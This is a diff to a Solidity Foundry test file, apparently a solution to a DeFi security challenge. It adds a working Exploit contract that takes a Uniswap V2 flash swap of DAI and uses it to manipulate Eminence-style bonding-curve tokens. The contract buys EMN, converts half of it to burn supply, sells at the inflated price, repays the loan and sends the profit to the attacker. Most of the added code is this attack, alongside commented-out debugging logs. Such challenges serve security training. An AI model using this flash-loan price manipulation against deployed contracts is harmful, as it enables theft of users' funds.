@@ -137,8 +137,53 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+       /* console.log("balance poolBalance : ", dai.balanceOf(address(eminenceCurrencyBase)));
+        //console.log("balance totalSupply : ", eminenceCurrencyBase.balanceOf(eminenceCurrencyBase));
+        bytes memory data = abi.encodeWithSignature("balanceOf(address)",address(adminUser));
+        bytes memory _balance;
+        bool sucess;
+        (sucess,_balance) = address(eminenceCurrencyBase).call(data);
+        console.log("balance EMN adminUser - before the burn : ", abi.decode(_balance,(uint256)));
+
+        data = abi.encodeWithSignature("balanceOf(address)",address(eminenceCurrency));
+        (sucess,_balance) = address(eminenceCurrencyBase).call(data);
+        console.log("balance EMN eminenceCurrency  ", abi.decode(_balance,(uint256)));
+
+        bytes memory _totalSupply;
+        data = abi.encodeWithSignature("totalSupply()");
+        (sucess,_totalSupply) = address(eminenceCurrencyBase).call(data);
+        console.log("balance EMN totalSupply - before the burn : ", abi.decode(_totalSupply,(uint256)));
+
+        data = abi.encodeWithSignature("balanceOf(address)",address(adminUser));
+        (sucess,_balance) = address(eminenceCurrency).call(data);
+        console.log("balance TOKEN adminUser : ", abi.decode(_balance,(uint256)));
+        
+        data = abi.encodeWithSignature("totalSupply()");
+        (sucess,_totalSupply) = address(eminenceCurrency).call(data);
+        console.log("balance TOKEN totalSupply : ", abi.decode(_totalSupply,(uint256)));
+
+        data = abi.encodeWithSignature("balanceOf(address)",address(adminUser));
+        (sucess,_balance) = address(eminenceCurrencyBase).call(data);
+        console.log("balance EMN adminUser - after the burn : ", abi.decode(_balance,(uint256)));
+
+        
+        data = abi.encodeWithSignature("totalSupply()");
+        (sucess,_totalSupply) = address(eminenceCurrencyBase).call(data);
+        console.log("balance EMN totalSupply - after the burn : ", abi.decode(_totalSupply,(uint256)));
+
+        eminenceCurrency.buy(0,0);*/
+
+        Exploit exploit = new Exploit(address(dai),address(eminenceCurrencyBase),address(eminenceCurrency),address(uniPair));
+        exploit.pwn();
 
         vm.stopPrank();
+
+        
+        /*console.log("amount DAI with totalSupply : ",abi.decode(_totalSupply,(uint256)) ," of EMN : ",IBondingCurve().calculateSaleReturn());
+        uint totalSupply_ = abi.decode(_totalSupply,(uint256)) - (abi.decode(_totalSupply,(uint256)) / 2);
+        console.log("amount DAI with totalSupply : ",totalSupply_ ," of EMN : ",IBondingCurve().calculateSaleReturn());
+        console.log("amount DAI with totalSupply : ",abi.decode(_totalSupply,(uint256)) ," of EMN : ",IBondingCurve().calculateSaleReturn());
+        */
         validation();
     }
 
@@ -150,4 +195,57 @@ contract Testing is Test {
 
     }
 
+}
+
+contract Exploit{
+    
+    address owner;
+    IUniswapV2Pair uniPair; // DAI-USDC trading pair
+    IWETH weth;
+    Token usdc;
+    Token dai;
+    IEminenceCurrency eminenceCurrencyBase;
+    IEminenceCurrency eminenceCurrency;
+
+    constructor(address _dai, address _eminenceCurrencyBase, address _eminenceCurrency, address _uniPair ){
+        owner = msg.sender;
+        dai = Token(_dai);
+        eminenceCurrencyBase = IEminenceCurrency(_eminenceCurrencyBase);
+        eminenceCurrency = IEminenceCurrency(_eminenceCurrency);
+        uniPair = IUniswapV2Pair(_uniPair);
+    }
+
+    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
+        uint256 daiAmount = dai.balanceOf(address(this));
+        console.log("balance dai of exploit : ",daiAmount);
+        
+        dai.approve(address(eminenceCurrencyBase),type(uint).max);
+        eminenceCurrencyBase.approve(address(eminenceCurrency),type(uint).max);
+
+        // --exploit swaps all DAI to EMN, convert 1/2 EMN to TOKEN 
+        eminenceCurrencyBase.buy(daiAmount,0);
+        uint256 eminenceCurrencyBaseAmount = eminenceCurrencyBase.balanceOf(address(this));
+
+        uint256 amount_ = eminenceCurrencyBaseAmount / 2;
+        eminenceCurrency.buy(amount_,0);
+        //With the convert we just burn the supply of EMN so for the first bonding curve if we sell we will gain higher that it supposed to be
+
+        eminenceCurrencyBase.sell(amount_,0);  
+
+        uint256 eminenceCurrencyAmount = eminenceCurrency.balanceOf(address(this));
+        eminenceCurrency.sell(eminenceCurrencyAmount,0);  
+        eminenceCurrencyBaseAmount = eminenceCurrencyBase.balanceOf(address(this));
+        eminenceCurrencyBase.sell(eminenceCurrencyBaseAmount,0);  
+
+        
+        console.log("balance dai of exploit : ",dai.balanceOf(address(this)));
+        console.log("amount to repay : ",(amount1Out * 103 /100)+1);//yeah the premium is a bit to high
+
+        dai.transfer(address(uniPair), (amount1Out * 103 /100)+1);
+        dai.transfer(owner, dai.balanceOf(address(this)));
+        console.log("balance dai of attacker : ",dai.balanceOf(address(owner)));
+    }
+    function pwn() external {
+        uniPair.swap(0,999_999e18,address(this), new bytes(1));
+    }
 }
